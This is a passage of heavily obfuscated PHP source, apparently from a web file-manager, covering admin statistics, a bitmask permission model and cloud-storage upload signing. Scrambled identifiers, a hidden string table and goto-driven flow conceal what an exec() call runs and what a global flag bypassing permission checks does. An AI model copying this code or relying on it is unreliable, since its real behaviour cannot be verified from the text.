($eÎ†ò¦øÏÍ[$f¯ìÔª¹¯Î] as $D©’–˜†Œ„ => $aê‚½¬ƒî) { $aÈ¸òŠ‹óœ[$D©’–˜†Œ„] = 0; } $Aõ×ÅÃ”—‰[] = $aÈ¸òŠ‹óœ; } $b¤…ÑÚ = array(); foreach ($Aõ×ÅÃ”—‰ as $aê‚½¬ƒî) { if ($f¯ìÔª¹¯Î == $a«Ï¿ƒÒÄ[2008] && $aê‚½¬ƒî[$a«Ï¿ƒÒÄ[2010]] > $aê‚½¬ƒî[$a«Ï¿ƒÒÄ[695]]) { $aê‚½¬ƒî[$a«Ï¿ƒÒÄ[2010]] = $aê‚½¬ƒî[$a«Ï¿ƒÒÄ[695]]; } foreach ($eÎ†ò¦øÏÍ[$f¯ìÔª¹¯Î] as $D©’–˜†Œ„ => $F´æÉ¶áÙ‚) { $fçË·í¿Š = array($a«Ï¿ƒÒÄ[206] => $aê‚½¬ƒî[$a«Ï¿ƒÒÄ[206]], $a«Ï¿ƒÒÄ[1323] => $F´æÉ¶áÙ‚); $fçË·í¿Š[$C‡ºà‘óØß[$f¯ìÔª¹¯Î]] = isset($aê‚½¬ƒî[$D©’–˜†Œ„]) ? $aê‚½¬ƒî[$D©’–˜†Œ„] : 0; $b¤…ÑÚ[] = $fçË·í¿Š; } } goto EÚĞÙ”ğç­; A–²ŒŸ°¨¡: } public function validDate($CİÆ¿¿½ÙÄ, $dˆµö®ÜÛ) { goto bàßêÔ†š; Bºãòä±: switch ($CİÆ¿¿½ÙÄ) { case $fÅ‰¨¶£´¯[1397]: $BßÌòò÷ÂÚ = mktime(0, 0, 0, date($fÅ‰¨¶£´¯[2030]), date($fÅ‰¨¶£´¯[2031]) - date($fÅ‰¨¶£´¯[1212]) + 7 - 7, date($fÅ‰¨¶£´¯[2032])); $Fêƒº…Å” = 0; do { $DóÂ§ø»Ï = date($fÅ‰¨¶£´¯[2013], $BßÌòò÷ÂÚ - 3600 * 24 * 7 * $Fêƒº…Å”); $B±¢Í„†ƒõ[] = $DóÂ§ø»Ï; $Fêƒº…Å”++; } while ($dˆµö®ÜÛ < $DóÂ§ø»Ï); break; case $fÅ‰¨¶£´¯[1395]: $Fêƒº…Å” = 1; do { $bŒÒÄ = date($fÅ‰¨¶£´¯[2033], strtotime("\55\x20{$Fêƒº…Å”}\x20\155\x6f\x6e\164\x68\163")); $B±¢Í„†ƒõ[] = $bŒÒÄ; $Fêƒº…Å”++; } while ($dˆµö®ÜÛ < $bŒÒÄ); break; case $fÅ‰¨¶£´¯[1701]: $cáö–ã§Àö = (int) date($fÅ‰¨¶£´¯[2032], strtotime($dˆµö®ÜÛ)); $c¿±¡ÂÑ§ˆ = (int) date($fÅ‰¨¶£´¯[2032]); if ($cáö–ã§Àö >= $c¿±¡ÂÑ§ˆ) { break; } for ($cáö–ã§Àö; $cáö–ã§Àö < $c¿±¡ÂÑ§ˆ; $cáö–ã§Àö++) { $B±¢Í„†ƒõ[] = $cáö–ã§Àö . $fÅ‰¨¶£´¯[2034]; } break; default: break; } if ($dˆµö®ÜÛ > end($B±¢Í„†ƒõ)) { array_pop($B±¢Í„†ƒõ); } sort($B±¢Í„†ƒõ); goto b·ô¾ïôçº; b·ô¾ïôçº: return $B±¢Í„†ƒõ; goto c¶İˆÛ¥ˆâ; bàßêÔ†š: $fÅ‰¨¶£´¯ =& $_SERVER[Ö¹ñÒÁ²÷]; $B¡ÃğŞİÇÕ = date($fÅ‰¨¶£´¯[2013], strtotime($fÅ‰¨¶£´¯[2014])); $B±¢Í„†ƒõ = array($B¡ÃğŞİÇÕ); goto Bºãòä±; c¶İˆÛ¥ˆâ: } public function listTable($Fš¾Š×ÂÌª) { $c’ƒ®šÀ¸ = ucfirst($Fš¾Š×ÂÌª); return Model($c’ƒ®šÀ¸)->listData(); } public function option($F†——Ÿª) { $d¾Áéë“‡ù = $_SERVER[Ö¹ñÒÁ²÷][2035] . ucfirst($F†——Ÿª); return $this->{$d¾Áéë“‡ù}(); } private function optionUser() { goto BÈ½–È·Í; f¨Å™–™èç: if (!$cñ±Á ÌòÙ) { $cñ±Á ÌòÙ = 1; } $Dçä×ÛÈÑ• = strtotime(date($c©°”†³Î²[2017])); $b¾×ê¸¸µ… = array($c©°”†³Î²[2038] => array($c©°”†³Î²[924], $Dçä×ÛÈÑ•)); goto cìÑÒ¦¿®ƒ; cìÑÒ¦¿®ƒ: $d’İ¿ÔíÇ = Model($c©°”†³Î²[473])->where($b¾×ê¸¸µ…)->count($c©°”†³Î²[1415]); return array($c©°”†³Î²[692] => (int) $C±Ü©¶º¾ƒ, $c©°”†³Î²[2039] => (int) ($C±Ü©¶º¾ƒ - $F«¸ÙšÑèç), $c©°”†³Î²[2040] => (int) $F«¸ÙšÑèç, $c©°”†³Î²[2041] => (int) $d’İ¿ÔíÇ, $c©°”†³Î²[2042] => $cñ±Á ÌòÙ); goto D‘•Ï¼Ú’; A‰›–×: $Dçä×ÛÈÑ• = strtotime($c©°”†³Î²[2037]); $b¾×ê¸¸µ… = array($c©°”†³Î²[2038] => array($c©°”†³Î²[924], $Dçä×ÛÈÑ•)); $cñ±Á ÌòÙ = (int) Model($c©°”†³Î²[473])->where($b¾×ê¸¸µ…)->count($c©°”†³Î²[1415]); goto f¨Å™–™èç; BÈ½–È·Í: $c©°”†³Î² =& $_SERVER[Ö¹ñÒÁ²÷]; $C±Ü©¶º¾ƒ = Model($c©°”†³Î²[473])->count($c©°”†³Î²[1415]); $F«¸ÙšÑèç = Model($c©°”†³Î²[473])->where($c©°”†³Î²[2036])->count($c©°”†³Î²[1415]); goto A‰›–×; D‘•Ï¼Ú’: } private function optionFile() { goto aÉÎ¬º¨ì÷; bìùº÷µ„á: $d±‹ë†èùÕ = $F‰ˆÛõ²‘[$fóåŒö°ß«[2010]]; $c«Ä·‹³¤Ó = Model($fóåŒö°ß«[749])->where(array($fóåŒö°ß«[366] => 0))->count($fóåŒö°ß«[365]); $bŠİó‡¨Ÿ¬ = array($fóåŒö°ß«[366] => 0, $fóåŒö°ß«[183] => array($fóåŒö°ß«[924], strtotime(date($fóåŒö°ß«[2017])))); goto fÅ™ˆŸß; fÅ™ˆŸß: $bÔäáÁ½Ç = Model($fóåŒö°ß«[749])->where($bŠİó‡¨Ÿ¬)->sum($fóåŒö°ß«[77]); $D¼ãƒÇ¸ºÓ = Model($fóåŒö°ß«[749])->where($bŠİó‡¨Ÿ¬)->count($fóåŒö°ß«[365]); return array($fóåŒö°ß«[695] => $A¦Üğ‘ˆ¢æ, $fóåŒö°ß«[2010] => $d±‹ë†èùÕ, $fóåŒö°ß«[2043] => $A¦Üğ‘ˆ¢æ - $d±‹ë†èùÕ, $fóåŒö°ß«[2044] => (int) $bÔäáÁ½Ç, $fóåŒö°ß«[697] => (int) $c«Ä·‹³¤Ó, $fóåŒö°ß«[2045] => (int) $D¼ãƒÇ¸ºÓ); goto DÃèãº¨õ; aÉÎ¬º¨ì÷: $fóåŒö°ß« =& $_SERVER[Ö¹ñÒÁ²÷]; $F‰ˆÛõ²‘ = $this->sourceSize(); $A¦Üğ‘ˆ¢æ = $F‰ˆÛõ²‘[$fóåŒö°ß«[77]]; goto bìùº÷µ„á; DÃèãº¨õ: } private function optionAccess() { $Bîõ¼¿Â¾ô =& $_SERVER[Ö¹ñÒÁ²÷]; return array($Bîõ¼¿Â¾ô[692] => $this->typeLogCnt(), $Bîõ¼¿Â¾ô[102] => $this->typeLogCnt($Bîõ¼¿Â¾ô[102]), $Bîõ¼¿Â¾ô[400] => $this->typeLogCnt($Bîõ¼¿Â¾ô[400]), $Bîõ¼¿Â¾ô[2046] => $this->typeLogCnt($Bîõ¼¿Â¾ô[2046]), $Bîõ¼¿Â¾ô[2047] => $this->typeLogCnt($Bîõ¼¿Â¾ô[2047]), $Bîõ¼¿Â¾ô[531] => $this->typeLogCnt($Bîõ¼¿Â¾ô[33], $Bîõ¼¿Â¾ô[2021])); } private function typeLogCnt($b³—ƒ½êšµ = '', $Añ…°‹ª÷ = "\x69\144") { goto Eñš„âßö¢; Eñš„âßö¢: $dÑÜ°Ø÷“ò =& $_SERVER[Ö¹ñÒÁ²÷]; $dÇ‰äÅ¤Æí = array($dÑÜ°Ø÷“ò[102] => array($dÑÜ°Ø÷“ò[2048], $dÑÜ°Ø÷“ò[2049]), $dÑÜ°Ø÷“ò[400] => array($dÑÜ°Ø÷“ò[2050], $dÑÜ°Ø÷“ò[2051]), $dÑÜ°Ø÷“ò[2046] => array($dÑÜ°Ø÷“ò[2052], $dÑÜ°Ø÷“ò[2053]), $dÑÜ°Ø÷“ò[2047] => array($dÑÜ°Ø÷“ò[2054], $dÑÜ°Ø÷“ò[2055]), $dÑÜ°Ø÷“ò[2056] => array($dÑÜ°Ø÷“ò[2057], $dÑÜ°Ø÷“ò[2058], $dÑÜ°Ø÷“ò[2059])); $d‚„©åÂÄ = strtotime(date($dÑÜ°Ø÷“ò[2017])); goto fğ‘õ½Ô; aÀÜÂï‘¯: return (int) $CÁ©¹²ƒ; goto d†ğÇ®Ô·£; fğ‘õ½Ô: $F¹‡ŠğË“ö = array($dÑÜ°Ø÷“ò[183] => array($dÑÜ°Ø÷“ò[924], $d‚„©åÂÄ)); if ($b³—ƒ½êšµ) { $F¹‡ŠğË“ö[$dÑÜ°Ø÷“ò[29]] = array($dÑÜ°Ø÷“ò[7], $dÇ‰äÅ¤Æí[$b³—ƒ½êšµ]); } $CÁ©¹²ƒ = Model($dÑÜ°Ø÷“ò[2020])->where($F¹‡ŠğË“ö)->count($Añ…°‹ª÷); goto aÀÜÂï‘¯; d†ğÇ®Ô·£: } private function optionServer() { goto cºù¯ôÜ; cå§ˆª¢…‚: if ($FçÈ¸¦Û¤ == $FíÚä¡‹•è[721]) { $b³º‘¦‰„Æ = explode($FíÚä¡‹•è[1070], $CÅø˜çº‘¬[$FíÚä¡‹•è[883]]); $FçÈ¸¦Û¤ = $b³º‘¦‰„Æ[0]; } if ($FçÈ¸¦Û¤ == $FíÚä¡‹•è[724] || $FçÈ¸¦Û¤ == $FíÚä¡‹•è[725]) { $D›ø®Ö§ë = Model()->db()->query($FíÚä¡‹•è[2060]); $FŠÇ†ØÆ©³ = $D›ø®Ö§ë[0] && isset($D›ø®Ö§ë[0][$FíÚä¡‹•è[1322]]) ? $D›ø®Ö§ë[0][$FíÚä¡‹•è[1322]] : 0; $FçÈ¸¦Û¤ = $FíÚä¡‹•è[2061] . ($FŠÇ†ØÆ©³ ? $FíÚä¡‹•è[8] . $FŠÇ†ØÆ©³ : $FíÚä¡‹•è[33]); } $b÷õã¯¦š± = $GLOBALS[$FíÚä¡‹•è[6]][$FíÚä¡‹•è[333]][$FíÚä¡‹•è[750]]; goto Cç·ÉáÂ¸; cºù¯ôÜ: $FíÚä¡‹•è =& $_SERVER[Ö¹ñÒÁ²÷]; $bÏ‰£§‰»… = $this->diskDriver(); $DïŠ‰Ğë®— = KodIO::defaultDriver(); goto D™İæÆÃÉØ; eÍ–ˆ‰¿ãË: $Fô‰ÒÚ‡Ñ = $A÷ÙË…§²[0]; $CÅø˜çº‘¬ = $GLOBALS[$FíÚä¡‹•è[6]][$FíÚä¡‹•è[17]]; $FçÈ¸¦Û¤ = $CÅø˜çº‘¬[$FíÚä¡‹•è[884]]; goto cå§ˆª¢…‚; D™İæÆÃÉØ: $dØ¢ğà¥ô = array($FíÚä¡‹•è[740] => $DïŠ‰Ğë®—[$FíÚä¡‹•è[363]]); $D¾õ‰àïíæ = Model($FíÚä¡‹•è[418])->where($dØ¢ğà¥ô)->sum($FíÚä¡‹•è[77]); $A÷ÙË…§² = explode($FíÚä¡‹•è[50], $_SERVER[$FíÚä¡‹•è[137]]); goto eÍ–ˆ‰¿ãË; Cç·ÉáÂ¸: return array($FíÚä¡‹•è[2062] => $bÏ‰£§‰»… ? $bÏ‰£§‰»…[$FíÚä¡‹•è[2063]] : 0, $FíÚä¡‹•è[2064] => $bÏ‰£§‰»… ? $bÏ‰£§‰»…[$FíÚä¡‹•è[2065]] : 0, $FíÚä¡‹•è[2066] => (int) $DïŠ‰Ğë®—[$FíÚä¡‹•è[2063]] * 1024 * 1024 * 1024, $FíÚä¡‹•è[2067] => (int) $D¾õ‰àïíæ, $FíÚä¡‹•è[2068] => ucfirst($Fô‰ÒÚ‡Ñ), $FíÚä¡‹•è[2069] => $FíÚä¡‹•è[2070] . PHP_VERSION, $FíÚä¡‹•è[2071] => phpBuild64() ? 64 : 32, $FíÚä¡‹•è[691] => str_replace($FíÚä¡‹•è[2072], $FíÚä¡‹•è[900], $FçÈ¸¦Û¤), $FíÚä¡‹•è[333] => ucfirst($b÷õã¯¦š±), $FíÚä¡‹•è[28] => $_SERVER[$FíÚä¡‹•è[2073]]); goto E‹¢ÜéÚ“Î; E‹¢ÜéÚ“Î: } private function diskDriver() { goto D‡‚õæ«Æã; B“ªë”Ó·¸: if ($cÔŸóâó) { $f·÷ó¾Ë® = $E™â‰Ï»…™[2076]; if (function_exists($E™â‰Ï»…™[2077])) { exec($E™â‰Ï»…™[2078], $d‹„Şøƒğ²); $f·÷ó¾Ë® = $d‹„Şøƒğ²[1] . $E™â‰Ï»…™[8]; } } if (!file_exists($f·÷ó¾Ë®)) { return; } $E”˜¾ÌÔÎÜ = @disk_total_space($f·÷ó¾Ë®); goto DÅĞ£®ŠÜó; D‡‚õæ«Æã: $E™â‰Ï»…™ =& $_SERVER[Ö¹ñÒÁ²÷]; $f·÷ó¾Ë® = $E™â‰Ï»…™[8]; $cÔŸóâó = $GLOBALS[$E™â‰Ï»…™[6]][$E™â‰Ï»…™[2074]] == $E™â‰Ï»…™[2075]; goto B“ªë”Ó·¸; DÅĞ£®ŠÜó: $e’”™ãìÏ = $E”˜¾ÌÔÎÜ - @disk_free_space($f·÷ó¾Ë®); return array($E™â‰Ï»…™[2063] => $E”˜¾ÌÔÎÜ, $E™â‰Ï»…™[2065] => $e’”™ãìÏ); goto Fé¡•±¤‹‚; Fé¡•±¤‹‚: } public function fileChart($eÊÜÔ×Ûö) { goto aîÅ¿”Äâ·; eâÜõ„¼ô©: $c˜—ÂÅ´ñç = $this->sourceSize(); $Cßµé»Êöá = array($FœÖ³çÌò[457] => 0, $FœÖ³çÌò[367] => 1); $d›‚ä¾­ô– = Model($FœÖ³çÌò[749])->where($Cßµé»Êöá)->sum($FœÖ³çÌò[77]); goto Dœœ÷ÂÃÆë; aîÅ¿”Äâ·: $FœÖ³çÌò =& $_SERVER[Ö¹ñÒÁ²÷]; if (isset($eÊÜÔ×Ûö[$FœÖ³çÌò[1415]])) { return Model($FœÖ³çÌò[749])->userFileTypeProfile($eÊÜÔ×Ûö[$FœÖ³çÌò[1415]]); } if (isset($eÊÜÔ×Ûö[$FœÖ³çÌò[2079]])) { return Model($FœÖ³çÌò[749])->groupFileTypeProfile($eÊÜÔ×Ûö[$FœÖ³çÌò[2079]]); } goto eâÜõ„¼ô©; Dœœ÷ÂÃÆë: $Cßµé»Êöá[$FœÖ³çÌò[367]] = 2; $eï‚ŸÖ”Ü = Model($FœÖ³çÌò[749])->where($Cßµé»Êöá)->sum($FœÖ³çÌò[77]); return array($FœÖ³çÌò[695] => $c˜—ÂÅ´ñç[$FœÖ³çÌò[77]], $FœÖ³çÌò[2010] => $c˜—ÂÅ´ñç[$FœÖ³çÌò[2010]], $FœÖ³çÌò[2011] => (int) $d›‚ä¾­ô–, $FœÖ³çÌò[2012] => (int) $eï‚ŸÖ”Ü); goto E¢æÕÆÊÕò; E¢æÕÆÊÕò: } private function sourceSize() { $DóÈ’†“ä =& $_SERVER[Ö¹ñÒÁ²÷]; $B›–çÂ¯Ù„ = Model($DóÈ’†“ä[749])->where(array($DóÈ’†“ä[366] => 0))->sum($DóÈ’†“ä[77]); $Bæô®ù·¶’ = Model($DóÈ’†“ä[418])->sum($DóÈ’†“ä[77]); if ($Bæô®ù·¶’ > $B›–çÂ¯Ù„) { $Bæô®ù·¶’ = $B›–çÂ¯Ù„; } return array($DóÈ’†“ä[77] => (int) $B›–çÂ¯Ù„, $DóÈ’†“ä[2010] => (int) $Bæô®ù·¶’); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $a—ñˆİŠŠª =& $_SERVER[Ö¹ñÒÁ²÷]; $Fì™·÷¢‚ = array(array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2080]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2082], $a—ñˆİŠŠª[2083] => 6, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2086]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2087], $a—ñˆİŠŠª[2083] => 1, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2088]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2089], $a—ñˆİŠŠª[2083] => 2, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2090]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2089], $a—ñˆİŠŠª[2083] => 3, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2091]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2092], $a—ñˆİŠŠª[2083] => 4, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_VIEW), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2093]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2094], $a—ñˆİŠŠª[2083] => 5, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($a—ñˆİŠŠª[382] => LNG($a—ñˆİŠŠª[2095]), $a—ñˆİŠŠª[2081] => $a—ñˆİŠŠª[2096], $a—ñˆİŠŠª[2083] => 7, $a—ñˆİŠŠª[2084] => 1, $a—ñˆİŠŠª[2085] => 0)); return $Fì™·÷¢‚; } public static function authCheck($c§ÌÖÚøë, $DñèÄóÌù¿) { $c§ÌÖÚøë = intval($c§ÌÖÚøë); if (_get($GLOBALS, $_SERVER[Ö¹ñÒÁ²÷][453])) { return !0; } if ($c§ÌÖÚøë <= 0) { return !1; } if (($c§ÌÖÚøë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($c§ÌÖÚøë & $DñèÄóÌù¿); } public static function authCheckShow($D†µçç±á¯) { return self::authCheck($D†µçç±á¯, self::AUTH_SHOW); } public static function authCheckView($c«¬¢ÃèÊ„) { return self::authCheck($c«¬¢ÃèÊ„, self::AUTH_VIEW); } public static function authCheckDownload($ešËŠÏ¬ ) { return self::authCheck($ešËŠÏ¬ , self::AUTH_DOWNLOAD); } public static function authCheckUpload($C®–„ÓŒÚ) { return self::authCheck($C®–„ÓŒÚ, self::AUTH_UPLOAD); } public static function authCheckEdit($c¯Í¾ä¼¿ä) { return self::authCheck($c¯Í¾ä¼¿ä, self::AUTH_EDIT); } public static function authCheckRemove($DåãÙù…ëõ) { return self::authCheck($DåãÙù…ëõ, self::AUTH_REMOVE); } public static function authCheckShare($aî†Á»–Š) { return self::authCheck($aî†Á»–Š, self::AUTH_SHARE); } public static function authCheckComment($BÆ’¾ê©¡‹) { return self::authCheck($BÆ’¾ê©¡‹, self::AUTH_COMMENT); } public static function authCheckEvent($eŸîæ‰‚½´) { return self::authCheck($eŸîæ‰‚½´, self::AUTH_EVENT); } public static function authCheckRoot($aÂÄ©ªñùä) { return self::authCheck($aÂÄ©ªñùä, self::AUTH_ROOT); } public static function authDisable($d©ò„øÃ, $EÌÑß¡ñÔ ) { if (intval($d©ò„øÃ) <= 0) { return 0; } return intval($d©ò„øÃ) & ~$EÌÑß¡ñÔ ; } public $optionType = "\x53\x79\x73\x74\145\155\x2e\x73\157\165\162\x63\145\x41\x75\164\150\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\141\165\x74\x68", "\x6c\x61\142\145\x6c", "\x64\151\163\160\x6c\141\171", "\x73\171\x73\164\145\x6d", "\x73\157\x72\x74"); public function initData() { $b¸ß©íÃÀÍ = $this->authDefault(); foreach ($b¸ß©íÃÀÍ as $f¬“‚Ü—Œã) { $this->add($f¬“‚Ü—Œã); } } public function listData($b»ø—âÖÜ» = false, $FÅ½ØÕ”©¹ = "\163\157\162\x74", $DåÃŠĞŒôŠ = false) { return parent::listData($b»ø—âÖÜ», $FÅ½ØÕ”©¹, $DåÃŠĞŒôŠ); } public function update($a¬¥ÖŒÁ§, $EÎ„¡ßóÃ) { $aÌÑ‡Íè÷ª =& $_SERVER[Ö¹ñÒÁ²÷]; $aªè¬ßöˆÔ = parent::listData($a¬¥ÖŒÁ§); $FŒŒ¿ŠÚ¿– = $this->findByName($EÎ„¡ßóÃ[$aÌÑ‡Íè÷ª[28]]); if (!$aªè¬ßöˆÔ || $FŒŒ¿ŠÚ¿– && $FŒŒ¿ŠÚ¿–[$aÌÑ‡Íè÷ª[363]] != $aªè¬ßöˆÔ[$aÌÑ‡Íè÷ª[363]]) { return !1; } $this->filterAuth($EÎ„¡ßóÃ[$aÌÑ‡Íè÷ª[372]]); return parent::update($a¬¥ÖŒÁ§, $EÎ„¡ßóÃ); } public function remove($fˆÔå´Îğ) { $B­±ò½ã½É = parent::listData($fˆÔå´Îğ); if (!$B­±ò½ã½É || $B­±ò½ã½É[$_SERVER[Ö¹ñÒÁ²÷][1074]]) { return !1; } return parent::remove($fˆÔå´Îğ); } public function add($cİ¢çÀæ— = array()) { goto D‡µ‰ñÆö‰; D‡µ‰ñÆö‰: $fµ†°¥®é× =& $_SERVER[Ö¹ñÒÁ²÷]; if ($this->findByName($cİ¢çÀæ—[$fµ†°¥®é×[28]])) { return !1; } $B—¬‡†³ = array($fµ†°¥®é×[28] => $fµ†°¥®é×[33], $fµ†°¥®é×[372] => 1, $fµ†°¥®é×[2097] => $fµ†°¥®é×[2098], $fµ†°¥®é×[2099] => 1, $fµ†°¥®é×[1074] => 0, $fµ†°¥®é×[2100] => 0); goto aˆ®ßí¯Ãß; aˆ®ßí¯Ãß: $cİ¢çÀæ— = array_merge($B—¬‡†³, $cİ¢çÀæ—); $cİ¢çÀæ—[$fµ†°¥®é×[2100]] = $this->getSort(); $this->filterAuth($cİ¢çÀæ—[$fµ†°¥®é×[372]]); goto C‘ÑÔš×ÔÊ; C‘ÑÔš×ÔÊ: return parent::insert($cİ¢çÀæ—); goto fÅ—º‹Çˆ; fÅ—º‹Çˆ: } private function getSort() { $b‚–¬§óóÕ =& $_SERVER[Ö¹ñÒÁ²÷]; $D†ƒ²§ù³± = parent::listData(); $Bğ¡Ç÷Š = array_to_keyvalue($D†ƒ²§ù³±, $b‚–¬§óóÕ[33], $b‚–¬§óóÕ[2100]); return empty($Bğ¡Ç÷Š) ? 0 : max($Bğ¡Ç÷Š) + 1; } private function filterAuth(&$E¹İ—é—÷Õ) { goto Eë¾ĞÒ•Š¦; B³†‡ø¸: foreach ($dáŒ¡† ¡ as $b±ãÁˆÄ·Ó) { if (isset($Eñ’œÆğ›ñ[$b±ãÁˆÄ·Ó])) { $dáŒ¡† ¡ = array_merge($dáŒ¡† ¡, $Eñ’œÆğ›ñ[$b±ãÁˆÄ·Ó]); } } $dáŒ¡† ¡[] = self::AUTH_SHOW; $E¹İ—é—÷Õ = array_sum(array_unique($dáŒ¡† ¡)); goto Dù°½Å§¡; D‡ãÓ¥áº: foreach ($BºÌØ‡ŒÁ‚ as $b±ãÁˆÄ·Ó) { if ($E¹İ—é—÷Õ & $b±ãÁˆÄ·Ó) { $dáŒ¡† ¡[] = $b±ãÁˆÄ·Ó; } } if (in_array(self::AUTH_ROOT, $dáŒ¡† ¡)) { $E¹İ—é—÷Õ = array_sum($BºÌØ‡ŒÁ‚); return; } $Eñ’œÆğ›ñ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto B³†‡ø¸; Eë¾ĞÒ•Š¦: if (!$E¹İ—é—÷Õ) { return; } $BºÌØ‡ŒÁ‚ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $dáŒ¡† ¡ = array(); goto D‡ãÓ¥áº; Dù°½Å§¡: } public function sort($F‘×ğŠ±ÇÚ, $CæíƒÛöÕ) { return parent::update($F‘×ğŠ±ÇÚ, $CæíƒÛöÕ); } } goto FÙ®ßÊÀÁ; CíÎÀÇŒ»ƒ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($Bè×‘Ššˆ‡) { parent::__construct($Bè×‘Ššˆ‡); $this->signatureVersion($_SERVER[Ö¹ñÒÁ²÷][196]); } public function uploadFormData($C·½†ÛƒŸ„, $Cƒƒ¿‹À = 3600) { goto aŞ…À˜ãŒ; A‹¶¿ÄÓÊ: return $C‘ÊäçŒ; goto cÑøª®çœ; FŞÕ”öµ‰: $dèØ‚‘Ò”› = sha1($aùÚ™¤ÁÌë); $CíÓ¨Ë­ôÜ = hash_hmac($DèÒÁÎİó[214], $dèØ‚‘Ò”›, $E¥Ñ·êçË…); $C‘ÊäçŒ = array($DèÒÁÎİó[1091] => $cÑ«²õÀÑ¼, $DèÒÁÎİó[1095] => $b¸ºİ´ÄƒÒ, $DèÒÁÎİó[1099] => base64_encode($aùÚ™¤ÁÌë), $DèÒÁÎİó[1096] => $Bºš‘öÖØÍ, $DèÒÁÎİó[1097] => $this->accessKey, $DèÒÁÎİó[1100] => $AØ‹õ‡êìÖ, $DèÒÁÎİó[1101] => $CíÓ¨Ë­ôÜ, $DèÒÁÎİó[165] => $this->getHost()); goto A‹¶¿ÄÓÊ; aŞ…À˜ãŒ: $DèÒÁÎİó =& $_SERVER[Ö¹ñÒÁ²÷]; $cÑ«²õÀÑ¼ = $DèÒÁÎİó[181]; $Bºš‘öÖØÍ = $DèÒÁÎİó[214]; goto C¾›”•‹; C¾›”•‹: $b¸ºİ´ÄƒÒ = $DèÒÁÎİó[1087]; $Dä³öö  = gmdate($DèÒÁÎİó[1088], time() + $Cƒƒ¿‹À); $AØ‹õ‡êìÖ = (string) time() . $DèÒÁÎİó[67] . (string) (time() + $Cƒƒ¿‹À); goto aÎºÅÃËê‘; aÎºÅÃËê‘: $aùÚ™¤ÁÌë = array($DèÒÁÎİó[1089] => $Dä³öö , $DèÒÁÎİó[1090] => array(array($DèÒÁÎİó[1091] => $cÑ«²õÀÑ¼), array($DèÒÁÎİó[1092] => $this->bucket), array($DèÒÁÎİó[1093], $DèÒÁÎİó[1094], $DèÒÁÎİó[33]), array($DèÒÁÎİó[1095] => $b¸ºİ´ÄƒÒ), array($DèÒÁÎİó[1096] => $Bºš‘öÖØÍ), array($DèÒÁÎİó[1097] => $this->accessKey), array($DèÒÁÎİó[1098] => $AØ‹õ‡êìÖ))); $aùÚ™¤ÁÌë = json_encode($aùÚ™¤ÁÌë); $E¥Ñ·êçË… = hash_hmac($DèÒÁÎİó[214], $AØ‹õ‡êìÖ, $this->secret); goto FŞÕ”öµ‰; cÑøª®çœ: } public function fileOutLink($a‘É¦½¼á…) { $Dõ° ˆí‹ô =& $_SERVER[Ö¹ñÒÁ²÷]; if (substr($a‘É¦½¼á…, 0, 7) == $Dõ° ˆí‹ô[1102]) { $a‘É¦½¼á… = $Dõ° ˆí‹ô[1103] . substr($a‘É¦½¼á…, 7); } header($Dõ° ˆí‹ô[152] . $a‘É¦½¼á…); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($f††Œì¬Å¯) { $this->pathParse = $f††Œì¬Å¯; $this->model = Model($_SERVER[Ö¹ñÒÁ²÷][1104]); } public function getPath($C³¤ª×¹Ô·) { return trim($C³¤ª×¹Ô·, $_SERVER[Ö¹ñÒÁ²÷][8]); } public function pathFather($eµ‡ƒ½×¸) { $eé±¢©äòé = $this->parse($eµ‡ƒ½×¸); $eé±¢©äòé = $this->infoSimple($eµ‡ƒ½×¸); return $eé±¢©äòé ? 